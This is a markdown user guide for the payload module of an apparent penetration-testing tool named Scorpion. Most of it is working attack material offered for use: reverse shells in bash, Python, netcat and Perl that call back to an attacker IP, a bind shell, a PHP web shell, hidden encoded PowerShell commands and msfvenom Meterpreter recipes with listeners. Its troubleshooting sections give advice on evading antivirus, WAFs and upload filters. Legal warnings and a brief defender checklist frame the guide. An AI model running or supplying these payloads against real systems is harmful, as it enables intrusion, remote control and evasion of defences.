# Payload Generation Guide

## Overview

Scorpion's payload generator creates **production-ready exploitation payloads** for penetration testing. Generate reverse shells, bind shells, web shells, and encoded payloads for various platforms.

## ⚠️ Legal Warning

**CRITICAL**: Only use payloads on systems you own or have explicit written authorization to test. Unauthorized payload deployment violates:
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK  
- Similar laws worldwide

**Obtain written permission before generating or deploying any payload.**

---

## Quick Start

```bash
# Generate basic reverse shell
scorpion payload --lhost 10.0.0.1 --lport 4444

# List all available payloads
scorpion payload --list --lhost 10.0.0.1

# Generate PowerShell reverse shell
scorpion payload --lhost 10.0.0.1 --lport 443 --type powershell

# Generate PHP web shell
scorpion payload --lhost 10.0.0.1 --type web_shell --shell php

# Generate with encoding
scorpion payload --lhost 10.0.0.1 --encode base64 --output payload.txt
```

---

## Features

### Payload Types
- ✅ **Reverse Shells**: Target connects back to attacker
- ✅ **Bind Shells**: Target listens, attacker connects
- ✅ **Web Shells**: Remote code execution via web
- ✅ **PowerShell Payloads**: Windows-specific with encoding
- ✅ **Msfvenom Integration**: Generate Metasploit-compatible payloads

### Shell Types
- Bash (Linux/Unix)
- Python (Cross-platform)
- PowerShell (Windows)
- Netcat (Unix)
- PHP (Web)
- Perl (Unix)
- Ruby (Unix)
- ASP (Windows/IIS)
- JSP (Java/Tomcat)

### Encoding Options
- Base64
- Hexadecimal
- URL encoding
- PowerShell Base64 (UTF-16LE)
- C byte array
- Python bytes

---

## Command Reference

### Basic Usage

```bash
scorpion payload --lhost <ATTACKER_IP> --lport <PORT> [OPTIONS]
```

### Required Options

| Option | Short | Description | Example |
|--------|-------|-------------|---------|
| `--lhost` | `-l` | Attacker's IP address | `--lhost 10.0.0.1` |

### Common Options

| Option | Short | Default | Description |
|--------|-------|---------|-------------|
| `--lport` | `-p` | `4444` | Listener port |
| `--type` | `-t` | `reverse_tcp` | Payload type |
| `--shell` | `-s` | `bash` | Shell interpreter |
| `--platform` | | `linux` | Target OS |
| `--encode` | `-e` | None | Encoding method |
| `--format` | `-f` | `raw` | Output format |
| `--output` | | None | Save to file |

---

## Reverse Shells

### Linux/Unix Reverse Shells

#### Bash Reverse Shell
```bash
scorpion payload --lhost 10.0.0.1 --lport 4444 --shell bash
```

**Output:**
```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

**Usage:**
```bash
# On attacker machine:
nc -lvnp 4444

# On target machine:
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

#### Python Reverse Shell
```bash
scorpion payload --lhost 10.0.0.1 --lport 4444 --shell python
```

**Output:**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

#### Netcat Reverse Shell
```bash
scorpion payload --lhost 10.0.0.1 --lport 4444 --shell netcat
```

**Output:**
```bash
nc -e /bin/sh 10.0.0.1 4444
```

#### Perl Reverse Shell
```bash
scorpion payload --lhost 10.0.0.1 --lport 4444 --shell perl
```

**Output:**
```perl
perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Windows Reverse Shells

#### PowerShell Reverse Shell
```bash
scorpion payload --lhost 10.0.0.1 --lport 443 --type powershell
```

**Output:** Base64-encoded PowerShell payload

**Usage:**
```bash
# On attacker:
nc -lvnp 443

# On target (encoded command provided):
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <BASE64_PAYLOAD>
```

#### Simple PowerShell
```bash
scorpion payload --lhost 10.0.0.1 --lport 443 --shell powershell_simple
```

---

## Bind Shells

### Netcat Bind Shell
```bash
scorpion payload --lhost 10.0.0.1 --lport 4444 --type bind_tcp --shell netcat
```

**Output:**
```bash
nc -lvnp 4444 -e /bin/sh
```

**Usage:**
```bash
# On target machine:
nc -lvnp 4444 -e /bin/sh

# On attacker machine:
nc <TARGET_IP> 4444
```

### Python Bind Shell
```bash
scorpion payload --lhost 10.0.0.1 --lport 4444 --type bind_tcp --shell python
```

---

## Web Shells

### PHP Web Shell (Simple)
```bash
scorpion payload --lhost 10.0.0.1 --type web_shell --shell php_simple
```

**Output:**
```php
<?php system($_GET["cmd"]); ?>
```

**Usage:**
```bash
# Upload shell.php to target
# Access: http://target/shell.php?cmd=whoami
```

### PHP Web Shell (Advanced)
```bash
scorpion payload --lhost 10.0.0.1 --type web_shell --shell php
```

**Output:** Full-featured PHP web shell with command input form

### ASP Web Shell
```bash
scorpion payload --lhost 10.0.0.1 --type web_shell --shell asp
```

**Output:** ASP web shell for Windows/IIS servers

### JSP Web Shell
```bash
scorpion payload --lhost 10.0.0.1 --type web_shell --shell jsp
```

**Output:** JSP web shell for Java/Tomcat servers

### Python Web Shell
```bash
scorpion payload --lhost 10.0.0.1 --type web_shell --shell python
```

**Output:** Python CGI web shell

---

## Encoding & Obfuscation

### Base64 Encoding
```bash
scorpion payload --lhost 10.0.0.1 --encode base64
```

### URL Encoding
```bash
scorpion payload --lhost 10.0.0.1 --encode url
```

### Hexadecimal Encoding
```bash
scorpion payload --lhost 10.0.0.1 --encode hex
```

### PowerShell Base64 (UTF-16LE)
```bash
scorpion payload --lhost 10.0.0.1 --type powershell --encode ps_base64
```

### All Encodings
```bash
scorpion payload --lhost 10.0.0.1 --encode all
```

**Output:** Generates all available encoded versions

### Obfuscation
```bash
scorpion payload --lhost 10.0.0.1 --type web_shell --shell php --obfuscate
```

**Output:** Obfuscated PHP web shell using base64 encoding

---

## Msfvenom Integration

Generate Metasploit-compatible payloads using `msfvenom` command generator.

### Windows Reverse TCP (EXE)
```bash
scorpion payload --lhost 10.0.0.1 --lport 4444 --msfvenom --platform windows --format exe
```

**Output:**
```bash
# Generation Command:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe

# Listener:
msfconsole commands:
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444
exploit
```

### Linux Reverse TCP (ELF)
```bash
scorpion payload --lhost 10.0.0.1 --lport 4444 --msfvenom --platform linux --format elf
```

### HTTPS Reverse Shell
```bash
scorpion payload --lhost 10.0.0.1 --lport 443 --msfvenom --type reverse_https --platform windows
```

---

## Advanced Examples

### Example 1: Encoded Reverse Shell for WAF Bypass

```bash
# Generate bash reverse shell with base64 encoding
scorpion payload --lhost 192.168.1.100 --lport 443 --shell bash --encode base64 --output encoded_payload.txt

# On attacker:
nc -lvnp 443

# On target:
echo "<BASE64_PAYLOAD>" | base64 -d | bash
```

### Example 2: PowerShell Payload for Windows

```bash
# Generate PowerShell reverse shell
scorpion payload --lhost 10.0.0.1 --lport 443 --type powershell --output ps_payload.txt

# On attacker:
nc -lvnp 443

# On target (execute provided encoded command):
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <BASE64_FROM_OUTPUT>
```

### Example 3: PHP Web Shell with Obfuscation

```bash
# Generate obfuscated PHP web shell
scorpion payload --lhost 10.0.0.1 --type web_shell --shell php --obfuscate --output shell.php

# Upload shell.php to target web server
# Access: http://target/shell.php?cmd=id
```

### Example 4: Multi-Platform Testing

```bash
# Linux
scorpion payload --lhost 10.0.0.1 --lport 4444 --shell bash --output linux_payload.sh

# Windows
scorpion payload --lhost 10.0.0.1 --lport 4444 --type powershell --output windows_payload.ps1

# Web (PHP)
scorpion payload --lhost 10.0.0.1 --type web_shell --shell php --output web_shell.php
```

### Example 5: Meterpreter Payload Generation

```bash
# Generate Windows Meterpreter payload
scorpion payload --lhost 10.0.0.1 --lport 4444 --msfvenom --platform windows --type reverse_tcp --format exe --output msfvenom_commands.txt

# Execute the command from output file
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe

# Setup listener using provided msfconsole commands
```

---

## Use Cases

### 1. Web Application Testing
```bash
# Generate PHP web shell for upload vulnerability testing
scorpion payload --lhost 10.0.0.1 --type web_shell --shell php

# Test file upload restriction bypass
scorpion payload --lhost 10.0.0.1 --type web_shell --shell php --obfuscate
```

### 2. Post-Exploitation
```bash
# After initial access, establish persistent connection
scorpion payload --lhost 10.0.0.1 --lport 443 --shell python --encode base64
```

### 3. Privilege Escalation Testing
```bash
# Generate bind shell for lateral movement
scorpion payload --lhost 10.0.0.1 --lport 5555 --type bind_tcp --shell netcat
```

### 4. Red Team Exercises
```bash
# Generate multiple payload variants
scorpion payload --lhost 10.0.0.1 --shell bash --output bash_rev.sh
scorpion payload --lhost 10.0.0.1 --shell python --output python_rev.py
scorpion payload --lhost 10.0.0.1 --shell perl --output perl_rev.pl
```

---

## Listener Setup

### Netcat Listener
```bash
# Basic listener
nc -lvnp 4444

# With verbose output
nc -lvnp 4444 -v

# IPv6 listener
nc -6 -lvnp 4444
```

### Socat Listener (with SSL)
```bash
# Generate SSL certificate
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# SSL listener
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork STDOUT
```

### Metasploit Listener
```bash
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; exploit"
```

---

## Payload Comparison

| Shell Type | Platform | Stealth | Reliability | Use Case |
|------------|----------|---------|-------------|----------|
| Bash | Linux/Unix | Medium | High | Quick exploitation |
| Python | Multi | High | High | Cross-platform |
| PowerShell | Windows | Low | Very High | Windows targets |
| Netcat | Linux/Unix | Low | High | Simple/fast |
| PHP | Web | Medium | Medium | Web apps |
| Perl | Linux/Unix | High | Medium | Advanced Unix |
| Ruby | Linux/Unix | High | Medium | Ruby environments |

---

## Security Best Practices

### For Attackers (Penetration Testers)

1. **Get Authorization**: Always have written permission
2. **Use Encryption**: Prefer HTTPS/SSL payloads
3. **Clean Up**: Remove payloads after testing
4. **Document**: Log all payload deployments
5. **Secure Storage**: Encrypt payload files at rest

### For Defenders

**Detection Indicators:**
- Suspicious network connections on unusual ports
- Encoded commands in PowerShell logs
- Web shells in upload directories
- Unusual process spawning (/bin/sh from web servers)
- Base64-encoded scripts

**Prevention:**
- Application whitelisting
- Network segmentation
- WAF deployment
- Input validation
- File upload restrictions
- Command injection filters

---

## Troubleshooting

### Payload Not Connecting

**Issue:** Reverse shell doesn't connect back

**Solutions:**
1. Check firewall rules on attacker machine
2. Verify listener is running (`nc -lvnp <PORT>`)
3. Confirm correct LHOST IP address
4. Test network connectivity (`ping`, `telnet`)
5. Check for NAT/firewall between target and attacker

### PowerShell Execution Policy

**Issue:** PowerShell refuses to run payload

**Solution:**
```powershell
# Bypass execution policy
powershell -ExecutionPolicy Bypass -File payload.ps1

# Or use encoded command (provided by payload generator)
powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <BASE64>
```

### Web Shell Upload Blocked

**Issue:** Cannot upload web shell to target

**Solutions:**
1. Try obfuscated version (`--obfuscate`)
2. Change file extension (`.php` → `.php5`, `.phtml`)
3. Use double extensions (`shell.jpg.php`)
4. Try different web shell type (PHP → ASP → JSP)
5. Encode payload (`--encode base64`)

### Antivirus Detection

**Issue:** Payload detected by AV

**Solutions:**
1. Use encoding (`--encode base64`)
2. Enable obfuscation (`--obfuscate`)
3. Use custom payload (modify generated code)
4. Encrypt payload
5. Use living-off-the-land binaries (LOLBins)

---

## Integration with Scorpion

### After Port Scanning

```bash
# 1. Scan target
scorpion scan 192.168.1.10 --os-detect --output scan.json

# 2. Generate appropriate payload based on OS
# If Windows detected:
scorpion payload --lhost 10.0.0.1 --lport 443 --type powershell

# If Linux detected:
scorpion payload --lhost 10.0.0.1 --lport 443 --shell bash
```

### After Web Vulnerability Scanning

```bash
# 1. Scan web application
scorpion webscan http://target.com --test-all

# 2. If file upload vuln found, generate web shell
scorpion payload --lhost 10.0.0.1 --type web_shell --shell php --output shell.php
```

### Automated Workflow

```bash
#!/bin/bash
# Automated scan and payload generation

TARGET="192.168.1.10"
LHOST="10.0.0.1"
LPORT=4444

# Scan target
echo "[+] Scanning target..."
scorpion scan $TARGET --os-detect --output scan.json

# Extract OS info
OS=$(jq -r '.os_detection.consensus.family' scan.json)

# Generate appropriate payload
echo "[+] Generating payload for $OS..."
if [ "$OS" = "windows" ]; then
    scorpion payload --lhost $LHOST --lport $LPORT --type powershell --output payload.txt
elif [ "$OS" = "linux" ]; then
    scorpion payload --lhost $LHOST --lport $LPORT --shell bash --output payload.txt
fi

echo "[+] Payload saved to payload.txt"
echo "[+] Start listener: nc -lvnp $LPORT"
```

---

## Python API

### Generate Payload Programmatically

```python
from python_scorpion.payload_generator import PayloadGenerator

generator = PayloadGenerator()

# Generate reverse shell
payload = generator.generate_reverse_shell(
    lhost="10.0.0.1",
    lport=4444,
    shell_type="bash",
    encoder="base64"
)

print(f"Type: {payload.type}")
print(f"Platform: {payload.platform}")
print(f"Code: {payload.code}")
print(f"Base64: {payload.encoded['base64']}")
```

### Generate Multiple Payloads

```python
shells = ["bash", "python", "netcat", "perl"]

for shell in shells:
    payload = generator.generate_reverse_shell(
        lhost="10.0.0.1",
        lport=4444,
        shell_type=shell
    )
    
    with open(f"payload_{shell}.txt", "w") as f:
        f.write(payload.code)
    
    print(f"Generated {shell} payload")
```

---

## References

- [GTFOBins](https://gtfobins.github.io/) - Unix binaries for privilege escalation
- [LOLBAS](https://lolbas-project.github.io/) - Living Off The Land Binaries (Windows)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Payload collection
- [RevShells](https://www.revshells.com/) - Reverse shell generator
- [Metasploit](https://www.metasploit.com/) - Exploitation framework

---

## Legal Notice

This tool is provided for **authorized security testing only**. The authors are not responsible for misuse. Users must:

1. Obtain written authorization before testing
2. Comply with all applicable laws
3. Respect system boundaries and permissions
4. Report findings responsibly
5. Clean up after testing

**Unauthorized access is illegal and punishable by law.**

---

**Last Updated**: December 2024  
**Scorpion Version**: 0.1.0+  
**Feature Status**: ✅ Production Ready
